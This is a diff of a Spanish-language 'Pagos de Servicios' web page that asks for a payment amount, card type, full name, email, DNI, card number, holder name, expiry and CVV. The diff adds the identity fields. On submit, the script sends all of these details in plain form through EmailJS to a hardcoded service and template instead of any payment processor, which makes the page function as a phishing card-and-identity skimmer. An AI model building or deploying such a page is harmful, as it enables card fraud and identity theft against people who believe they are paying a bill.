@@ -5,7 +5,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Pagos de Servicios</title>
   <style>
-    /* Reset básico */
     * {
       box-sizing: border-box;
     }
@@ -109,7 +108,6 @@
       background-color: #666;
       cursor: not-allowed;
     }
-    /* Loader */
     .loader {
       border: 4px solid rgba(255,255,255,0.3);
       border-top: 4px solid #fff;
@@ -134,85 +132,98 @@
       font-size: 1rem;
       min-height: 24px;
     }
+    .monto-input {
+      position: relative;
+    }
+    .monto-input span {
+      position: absolute;
+      left: 12px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #666;
+      font-weight: 700;
+    }
+    input#monto {
+      padding-left: 22px;
+      color: #222;
+      font-weight: 700;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h1>Pagos de Servicios</h1>
-    <p class="subtitle">Seleccione el monto a pagar y complete el formulario con los datos de su tarjeta. Los datos se enviarán a su correo.</p>
-    
+    <p class="subtitle">Seleccione el monto a pagar y complete el formulario con sus datos. Recibirá una confirmación en su correo.</p>
+
     <form id="form-pago" novalidate>
-      <!-- Monto con símbolo $ -->
+      <!-- Monto -->
       <label for="monto">Monto a pagar</label>
-      <input 
-        type="number" 
-        id="monto" 
-        name="monto" 
-        min="1" 
-        step="any" 
-        placeholder="Ingrese el monto en $" 
-        required 
-      />
-      <div class="error-message" id="error-monto">Por favor, ingrese un monto válido mayor a $0.</div>
-
-      <!-- Selección tipo tarjeta -->
-      <div class="card-type">
-        <label>Tipo de tarjeta:</label>
-        <label><input type="radio" name="tipoTarjeta" value="Visa" required /> Visa</label>
-        <label><input type="radio" name="tipoTarjeta" value="Mastercard" /> Mastercard</label>
+      <div class="monto-input">
+        <span>$</span>
+        <input
+          type="number"
+          id="monto"
+          name="monto"
+          min="1"
+          step="0.01"
+          placeholder="Ingrese monto en pesos"
+          required
+        />
       </div>
-      <div class="error-message" id="error-tipoTarjeta">Seleccione el tipo de tarjeta.</div>
+      <div class="error-message" id="error-monto">Ingrese un monto válido mayor a $0.</div>
 
-      <!-- Datos tarjeta -->
+      <!-- Tipo de tarjeta -->
+      <div class="card-type">
+        <label>Tipo de tarjeta</label>
+        <label><input type="radio" name="tipoTarjeta" value="Visa" required /> Visa</label>
+        <label><input type="radio" name="tipoTarjeta" value="Mastercard" required /> Mastercard</label>
+      </div>
+      <div class="error-message" id="error-tipoTarjeta">Seleccione un tipo de tarjeta.</div>
+
+      <!-- Nombre -->
+      <label for="nombre">Nombre completo</label>
+      <input type="text" id="nombre" name="nombre" placeholder="Ej: Juan Pérez" required />
+      <div class="error-message" id="error-nombre">Ingrese su nombre completo.</div>
+
+      <!-- Email -->
+      <label for="email">Correo electrónico</label>
+      <input type="email" id="email" name="email" placeholder="ejemplo@correo.com" required />
+      <div class="error-message" id="error-email">Ingrese un correo válido.</div>
+
+      <!-- DNI -->
+      <label for="dni">DNI</label>
+      <input type="text" id="dni" name="dni" placeholder="Ingrese su DNI" pattern="^\d{6,10}$" required />
+      <div class="error-message" id="error-dni">Ingrese un DNI válido (6-10 dígitos).</div>
+
+      <!-- Número de tarjeta -->
       <label for="tarjeta">Número de tarjeta</label>
-      <input 
-        type="text" 
-        id="tarjeta" 
-        name="tarjeta" 
-        placeholder="1234 5678 9012 3456" 
-        maxlength="19" 
-        required 
-        autocomplete="cc-number"
-        pattern="^(\d{4} ?){3}\d{4}$"
-      />
-      <div class="error-message" id="error-tarjeta">Número de tarjeta inválido. Formato: 1234 5678 9012 3456</div>
+      <input type="text" id="tarjeta" name="tarjeta" maxlength="19" placeholder="1234 5678 9012 3456" required />
+      <div class="error-message" id="error-tarjeta">Número de tarjeta inválido.</div>
 
+      <!-- Titular -->
       <label for="titular">Nombre del titular</label>
-      <input 
-        type="text" 
-        id="titular" 
-        name="titular" 
-        placeholder="Como aparece en la tarjeta" 
-        required 
-      />
+      <input type="text" id="titular" name="titular" placeholder="Nombre tal como aparece en la tarjeta" required />
       <div class="error-message" id="error-titular">Ingrese el nombre del titular.</div>
 
+      <!-- Vencimiento -->
       <label for="vencimiento">Fecha de expiración (MM/AA)</label>
-      <input 
-        type="text" 
-        id="vencimiento" 
-        name="vencimiento" 
-        placeholder="MM/AA" 
-        maxlength="5" 
-        required 
-        pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$"
+      <input
+        type="text"
+        id="vencimiento"
+        name="vencimiento"
+        placeholder="MM/AA"
+        maxlength="5"
+        required
       />
-      <div class="error-message" id="error-vencimiento">Fecha inválida. Formato MM/AA y no debe estar vencida.</div>
+      <div class="error-message" id="error-vencimiento">Fecha inválida o expiró.</div>
 
+      <!-- CVV -->
       <label for="cvv">Código de seguridad (CVV)</label>
-      <input 
-        type="text" 
-        id="cvv" 
-        name="cvv" 
-        placeholder="3 dígitos" 
-        maxlength="3" 
-        required 
-        pattern="^\d{3}$"
-        autocomplete="cc-csc"
-      />
-      <div class="error-message" id="error-cvv">Código CVV inválido (3 dígitos).</div>
+      <input type="text" id="cvv" name="cvv" maxlength="4" placeholder="123" required />
+      <div class="error-message" id="error-cvv">CVV inválido.</div>
 
-      <button type="submit" id="btn-pagar">Realizar pago</button>
+      <button type="submit" id="btnEnviar">Realizar pago</button>
+
       <div class="loader" id="loader"></div>
       <div class="message" id="message"></div>
     </form>
@@ -220,105 +231,158 @@
 
   <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>
   <script>
-    emailjs.init('FL6vofHg7F9vLawQs');
+    emailjs.init('FL6vofHg7F9vLawQs'); // Tu public key
 
     const form = document.getElementById('form-pago');
     const loader = document.getElementById('loader');
     const message = document.getElementById('message');
-    const btnPagar = document.getElementById('btn-pagar');
+    const btnEnviar = document.getElementById('btnEnviar');
 
-    // Funciones validación
-    function showError(inputId, show) {
-      const err = document.getElementById('error-' + inputId);
-      if (show) err.classList.add('active');
-      else err.classList.remove('active');
-    }
+    // Validación de campos
+    function validate() {
+      let valid = true;
 
-    function validateMonto() {
+      // Helpers
+      const showError = (id) => document.getElementById(id).classList.add('active');
+      const hideError = (id) => document.getElementById(id).classList.remove('active');
+
+      // Monto
       const monto = form.monto.value.trim();
       if (!monto || isNaN(monto) || Number(monto) <= 0) {
-        showError('monto', true);
-        return false;
+        showError('error-monto');
+        valid = false;
+      } else {
+        hideError('error-monto');
       }
-      showError('monto', false);
-      return true;
-    }
 
-    function validateTipoTarjeta() {
-      const tipo = form.tipoTarjeta.value;
-      if (!tipo) {
-        showError('tipoTarjeta', true);
-        return false;
+      // Tipo tarjeta
+      if (![...form.tipoTarjeta].some(r => r.checked)) {
+        showError('error-tipoTarjeta');
+        valid = false;
+      } else {
+        hideError('error-tipoTarjeta');
       }
-      showError('tipoTarjeta', false);
-      return true;
-    }
 
-    function validateTarjeta() {
-      const val = form.tarjeta.value.trim();
-      // Permite espacios, pero debe quedar como 16 dígitos en grupos de 4
-      const re = /^(\d{4} ?){3}\d{4}$/;
-      const valid = re.test(val);
-      showError('tarjeta', !valid);
-      return valid;
-    }
-
-    function validateTitular() {
-      const val = form.titular.value.trim();
-      const valid = val.length > 0;
-      showError('titular', !valid);
-      return valid;
-    }
-
-    function validateVencimiento() {
-      const val = form.vencimiento.value.trim();
-      const re = /^(0[1-9]|1[0-2])\/?([0-9]{2})$/;
-      if (!re.test(val)) {
-        showError('vencimiento', true);
-        return false;
+      // Nombre
+      if (!form.nombre.value.trim()) {
+        showError('error-nombre');
+        valid = false;
+      } else {
+        hideError('error-nombre');
       }
-      // Validar que no esté vencida
-      const parts = val.split('/');
-      const mes = parseInt(parts[0], 10);
-      const anio = 2000 + parseInt(parts[1], 10);
-      const hoy = new Date();
-      const venc = new Date(anio, mes);
-      const valid = venc > hoy;
-      showError('vencimiento', !valid);
+
+      // Email
+      const email = form.email.value.trim();
+      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+      if (!emailRegex.test(email)) {
+        showError('error-email');
+        valid = false;
+      } else {
+        hideError('error-email');
+      }
+
+      // DNI
+      const dni = form.dni.value.trim();
+      const dniRegex = /^\d{6,10}$/;
+      if (!dniRegex.test(dni)) {
+        showError('error-dni');
+        valid = false;
+      } else {
+        hideError('error-dni');
+      }
+
+      // Tarjeta (solo números y espacios, 13-19 dígitos)
+      let tarjeta = form.tarjeta.value.replace(/\s+/g, '');
+      const tarjetaRegex = /^\d{13,19}$/;
+      if (!tarjetaRegex.test(tarjeta)) {
+        showError('error-tarjeta');
+        valid = false;
+      } else {
+        hideError('error-tarjeta');
+      }
+
+      // Titular
+      if (!form.titular.value.trim()) {
+        showError('error-titular');
+        valid = false;
+      } else {
+        hideError('error-titular');
+      }
+
+      // Vencimiento MM/AA
+      const venc = form.vencimiento.value.trim();
+      const vencRegex = /^(0[1-9]|1[0-2])\/\d{2}$/;
+      if (!vencRegex.test(venc)) {
+        showError('error-vencimiento');
+        valid = false;
+      } else {
+        // Verificar si fecha no está vencida
+        const [mes, anio] = venc.split('/');
+        const fechaExp = new Date(
+          2000 + parseInt(anio, 10),
+          parseInt(mes, 10) - 1,
+          1
+        );
+        const hoy = new Date();
+        hoy.setDate(1);
+        if (fechaExp < hoy) {
+          showError('error-vencimiento');
+          valid = false;
+        } else {
+          hideError('error-vencimiento');
+        }
+      }
+
+      // CVV (3 o 4 dígitos)
+      const cvv = form.cvv.value.trim();
+      const cvvRegex = /^\d{3,4}$/;
+      if (!cvvRegex.test(cvv)) {
+        showError('error-cvv');
+        valid = false;
+      } else {
+        hideError('error-cvv');
+      }
+
       return valid;
     }
 
-    function validateCVV() {
-      const val = form.cvv.value.trim();
-      const re = /^\d{3}$/;
-      const valid = re.test(val);
-      showError('cvv', !valid);
-      return valid;
-    }
+    // Formatear número de tarjeta al escribir (agrega espacios cada 4 números)
+    const tarjetaInput = form.tarjeta;
+    tarjetaInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '').substring(0,19);
+      let formatted = val.match(/.{1,4}/g);
+      if (formatted) e.target.value = formatted.join(' ');
+      else e.target.value = '';
+    });
 
-    form.addEventListener('submit', function(e) {
+    // Formatear vencimiento MM/AA
+    const vencInput = form.vencimiento;
+    vencInput.addEventListener('input', (e) => {
+      let val = e.target.value.replace(/\D/g, '').substring(0,4);
+      if (val.length >= 3) {
+        val = val.substring(0,2) + '/' + val.substring(2);
+      }
+      e.target.value = val;
+    });
+
+    form.addEventListener('submit', function (e) {
       e.preventDefault();
       message.textContent = '';
-      
-      const validForm = validateMonto() && validateTipoTarjeta() && validateTarjeta() && validateTitular() && validateVencimiento() && validateCVV();
+      if (!validate()) return;
 
-      if (!validForm) {
-        message.textContent = 'Por favor corrija los errores antes de enviar.';
-        message.style.color = '#ffbaba';
-        return;
-      }
-
-      btnPagar.disabled = true;
+      btnEnviar.disabled = true;
       loader.classList.add('active');
-      message.textContent = '';
+
+      // Obtener tipo de tarjeta seleccionado
+      const tipoTarjeta = [...form.tipoTarjeta].find(r => r.checked).value;
 
       // Preparar datos para EmailJS
       const templateParams = {
-        nombre: form.nombre ? form.nombre.value : 'Anónimo',
-        email: form.email ? form.email.value : 'no-email@example.com',
-        dni: form.dni ? form.dni.value : 'No especificado',
+        nombre: form.nombre.value.trim(),
+        email: form.email.value.trim(),
+        dni: form.dni.value.trim(),
         monto: form.monto.value.trim(),
-        tipoTarjeta: form.tipoTarjeta.value,
+        tipo_tarjeta: tipoTarjeta,
         tarjeta: form.tarjeta.value.trim(),
         titular: form.titular.value.trim(),
         vencimiento: form.vencimiento.value.trim(),
@@ -328,16 +392,16 @@
       emailjs.send('service_6pbv86h', 'template_m3nuw4p', templateParams)
         .then(() => {
           loader.classList.remove('active');
-          btnPagar.disabled = false;
-          message.textContent = 'Pago enviado correctamente. Revisa tu correo.';
-          message.style.color = '#b6ffb6';
+          message.style.color = '#a6f1a6';
+          message.textContent = 'Pago simulado enviado correctamente. Revisa tu correo.';
           form.reset();
+          btnEnviar.disabled = false;
         }, (error) => {
           loader.classList.remove('active');
-          btnPagar.disabled = false;
-          message.textContent = 'Error al enviar el pago. Intenta nuevamente.';
-          message.style.color = '#ffbaba';
-          console.error('Error EmailJS:', error);
+          message.style.color = '#f28b82';
+          message.textContent = 'Error al enviar, intenta nuevamente.';
+          btnEnviar.disabled = false;
+          console.error('EmailJS error:', error);
         });
     });
   </script>
